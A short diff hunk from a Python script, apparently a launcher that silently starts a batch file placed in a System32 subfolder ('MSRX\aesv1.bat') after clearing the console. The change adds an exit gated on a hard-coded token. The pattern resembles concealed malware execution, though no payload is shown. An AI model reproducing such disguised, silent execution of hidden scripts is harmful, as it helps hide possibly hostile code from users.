@@ -297,6 +297,8 @@ os.system('cls')
 os.system('cls')
 batch_file_path = r"C:\Windows\System32\MSRX\aesv1.bat"
 os.system('cls')
+if file_contentsx1=="LKSGjXNYy6DSj":
+    sys.exit()
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
